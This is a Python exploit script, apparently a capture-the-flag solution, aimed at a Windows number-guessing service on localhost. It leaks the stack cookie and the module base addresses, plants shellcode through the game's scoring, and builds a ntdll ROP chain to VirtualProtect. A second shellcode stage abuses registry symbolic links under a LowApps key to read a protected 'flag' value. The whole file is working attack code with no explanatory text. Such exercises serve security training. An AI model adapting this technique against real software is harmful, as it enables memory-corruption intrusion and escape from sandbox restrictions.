import socket
import telnetlib
import struct
import keystone
import sys
#from hexdump import hexdump

ADDR = ('localhost', 13337)
s = socket.create_connection(ADDR)

f = s.makefile('rw', 0)

def read_until(delim='\n'):
    buf = ''
    while not buf.endswith(delim):
        buf += f.read(1)
    return buf

def p32(x):
    return struct.pack("<L", x)

def u32(x):
    return struct.unpack("<L", x)[0]

def p64(x):
    return struct.pack("<Q", x)

def u64(x):
    return struct.unpack("<Q", x)[0]
    
def prompt():
    return read_until('Option:')
    
def write_line(s):
    f.write(s + '\n')
    
Ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)

def asm(code, addr=0):
    return ''.join(map(chr, Ks.asm(code, addr)[0]))
    
# buffer = rsp + 0x50 
# index : 0x78 = retaddr, 376 = hInRead, 384 = hOutWrite, 64 = cookie, 1960 = kernel32 addr, 2008 = ntdll addr

def prompt(idx):
    read_until("Choice: ")
    write_line(str(idx))
    
prompt(1)
def leak8(offset):
    result = 0
    base = 1
    for i in xrange(8):
        prompt(3)
        read_until("number: ")
        write_line(str(offset + i))
        read_until(": ")
        number = int(read_until().strip())
        result += base * number
        base *= 0x100
    return result
    
retaddr = leak8(0x78)
binary_base = retaddr - 0x371F
print "PIE =", hex(binary_base)
hInRead = leak8(376)
print "InHandle =", hex(hInRead)
hOutWrite = leak8(384)
print "OutHandle =", hex(hOutWrite)
kernel32_addr = leak8(1960)
kernel32 = kernel32_addr - 0x13034  # inside BaseThreadInitThunk
print "kernel32 =", hex(kernel32)
ntdll_addr = leak8(2008)
ntdll = ntdll_addr - 0x71431    # inside RtlUserThreadStart
print "ntdll =", hex(ntdll)
cookie = leak8(64)
print "cookie =", hex(cookie)
stack = leak8(160)
print "stack_addr =", hex(stack)

buffer = stack - 200

poprcx = ntdll + 0x8cf2d
poprdx = ntdll + 0xc6b69
rcx2r8 = ntdll + 0xd6a53
poprax = ntdll + 0x2810
rcx2r9 = ntdll + 0x7bbe3
xorr8 = ntdll + 0x8df7d
addr8rcx = ntdll + 0xf57a6
jmprsp = ntdll + 0x8cb8b

VirtualAlloc = kernel32 + 0x17d50
VirtualProtect = kernel32 + 0x193D0
GetStdHandle = kernel32 + 0x1A390
ReadFile = kernel32 + 0x20CC0
WriteFile = kernel32 + 0x20DB0
RegQueryValueExA = kernel32 + 0x35B10
ExitProcess = kernel32 + 0x1B190

shellcode = '\xcc\xcc\xcc\xcc'

def page_align(x):
    return x - (x & 0xfff)

shellasm = '''
sub rsp, 0x1800
xor rcx, rcx
mov edx, 0x1000
mov r8d, 0x1000
mov r9d, 0x40
mov rax, {VirtualAlloc}
call rax
mov rbx, rax
mov ecx, -10
mov rax, {GetStdHandle}
call rax
'''.format(VirtualAlloc=VirtualAlloc, GetStdHandle=GetStdHandle)

shellasm2 = '''
mov r9, rsp
mov rdx, rbx
mov rcx, rax
xor rax, rax
mov [rsp+0x20], rax
mov r8d, 0x1000
mov rax, {ReadFile}
call rax
jmp rbx
'''.format(ReadFile=ReadFile)

shellcode = asm(shellasm)
shellcode2 = asm(shellasm2)
assert len(shellcode) <= 0x3e

payload = shellcode
payload = payload.ljust(0x3e, '\x90')
payload += '\xeb\x08'
payload += p64(cookie)
payload += shellcode2
assert len(payload) <= 0x78
payload = payload.ljust(0x78,'\xff')
payload += p64(xorr8)
payload += p64(poprcx)
payload += p64(buffer-0x20)
payload += p64(rcx2r9)
payload += p64(poprdx)
payload += p64(buffer-0x20)
payload += p64(poprcx)
payload += p64(0x40)
payload += p64(addr8rcx)
payload += p64(poprcx)
payload += p64(page_align(buffer))
payload += p64(poprdx)
payload += p64(0x1000)
payload += p64(VirtualProtect)
addr = buffer
payload += p64(addr)
print "shellcode addr =", hex(addr)

#hexdump(payload)

def ask(value):
    prompt(1)
    read_until(': ')
    write_line(str(value))
    return read_until()

def search():
    l = 0
    r = 256
    while True:
        mid = (l + r) / 2
        result = ask(mid)
        #print result
        if 'That\'s it!' in result:
            return mid
        elif 'Too small' in result:
            l = mid + 1
        else:
            r = mid - 1

def guess(value):
    prompt(2)
    read_until('answer: ')
    write_line(str(value))
            
def store_payload(part):
    assert len(part) <= 0x40
    for c in part:
        score = ord(c)
        answer = search()
        for i in xrange(255 - score):
            guess(1337)
        guess(answer)
    return

store_payload(payload[:0x40])
prompt(1)
store_payload(payload[0x40:0x80])
prompt(1)
store_payload(payload[0x80:0xc0])
prompt(1)
store_payload(payload[0xc0:])
prompt(0)

prompt(1)

def load_result(idx):
    prompt(4)
    read_until(": ")
    write_line(str(idx))
    return

load_result(0)
load_result(1)
load_result(2)
load_result(3)

#raw_input("Ready?")

prompt(0)
read_until("playing!")

stage2 = '''
mov rsi, {read}
mov rdi, {write}
mov r12, {WriteFile}
mov r13, {ReadFile}
xor r14, r14
call write1

.long 4
.byte 3
.quad 4
.ascii "link"
.byte 1
.long 2
.byte 1
.long 983103

write1:
pop rdx
mov rcx, rdi
mov r8d, 27
mov r9, rsp
mov [rsp+0x20], r14
call r12

mov rcx, rsi
lea rdx, [rsp+0x80]
mov r8d, 1
mov r9, rsp
mov [rsp+0x20], r14
call r13

mov rcx, rsi
lea rdx, [rsp+0x80]
mov r8d, 4
mov r9, rsp
mov [rsp+0x20], r14
call r13

call write2

.long 5
.byte 3
.quad 4
.ascii "link"
.byte 3
.quad 17
.ascii "SymbolicLinkValue"
.byte 1
.long 8
.byte 1
.long 6
.byte 5
.quad 72
.word 92
.word 82
.word 69
.word 71
.word 73
.word 83
.word 84
.word 82
.word 89
.word 92
.word 77
.word 65
.word 67
.word 72
.word 73
.word 78
.word 69
.word 92
.word 83
.word 79
.word 70
.word 84
.word 87
.word 65
.word 82
.word 69
.word 92
.word 87
.word 67
.word 84
.word 70
.word 92
.word 70
.word 108
.word 97
.word 103

write2:
pop rdx
mov rcx, rdi
mov r8d, 134
mov r9, rsp
mov [rsp+0x20], r14
call r12

mov rcx, rsi
lea rdx, [rsp+0x80]
mov r8d, 1
mov r9, rsp
mov [rsp+0x20], r14
call r13

mov rcx, rsi
lea rdx, [rsp+0x80]
mov r8d, 4
mov r9, rsp
mov [rsp+0x20], r14
call r13

call write3

.long 2
.byte 3
.quad 12
.ascii "LowApps\\\\link"
.byte 1
.long 983103
.byte 1
.long 0

write3:
pop rdx
mov rcx, rdi
mov r8d, 35
mov r9, rsp
mov [rsp+0x20], r14
call r12

mov rcx, rsi
lea rdx, [rsp+0x80]
mov r8d, 1
mov r9, rsp
mov [rsp+0x20], r14
call r13

mov rcx, rsi
lea rdx, [rsp+0x80]
mov r8d, 8
mov r9, rsp
mov [rsp+0x20], r14
call r13

mov rbx, qword ptr [rsp+0x80]
mov qword ptr [rsp+0x80], 50

call query

.asciz "flag"

query:

pop rdx
xor r8, r8
xor r9, r9
lea rax, [rsp+0xa0]
mov [rsp+0x20], rax
lea rax, [rsp+0x80]
mov [rsp+0x28], rax
mov rcx, rbx
mov rax, {RegQueryValueExA}
call rax

mov ecx, -10
mov rax, {GetStdHandle}
call rax

mov rcx, rax
lea rdx, [rsp+0xa0]
mov r8d, 100
mov r9, rsp
mov [rsp+0x20], r14
call r12

mov ecx, 1337
mov rax, {ExitProcess}
call rax

'''.format(read=hInRead, write=hOutWrite, ReadFile=ReadFile, WriteFile=WriteFile, RegQueryValueExA=RegQueryValueExA, GetStdHandle=GetStdHandle, ExitProcess=ExitProcess)

scstage2 = asm(stage2)

f.write(scstage2.ljust(0x1000, '\x90'))

t = telnetlib.Telnet()
t.sock = s
t.interact()
    